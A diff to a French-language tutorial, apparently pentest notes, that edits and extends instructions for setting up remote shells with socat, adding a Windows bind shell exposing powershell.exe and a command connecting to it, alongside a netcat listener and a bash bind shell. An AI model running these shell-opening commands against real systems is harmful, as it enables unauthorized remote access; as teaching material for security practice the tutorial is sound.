@@ -8,7 +8,7 @@ Pour setup un reverse shell avec socat c'est légèrement plus compliqué qu'ave
 Sur notre machine il faut effectuer la commande :
 
 ```shell
-user@ip:~$ socat TCP-L:1345 -
+user@ip: ~$ socat TCP-L:1345 -
 ```
 
 Cette commande est équivalente à faire **`nc -vnlp 1234`**.
@@ -43,5 +43,12 @@ user@raspberrypi: ~$ socat TCP-L:<TARGET-PORT> EXEC:"bash -li"
 2) Sur une machine Windows
 
 ```shell
-
+PS C:\Users\user> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 ```
+
+#### 2- Connection -- Notre machine
+
+```shell
+user@ip: ~$ socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
+
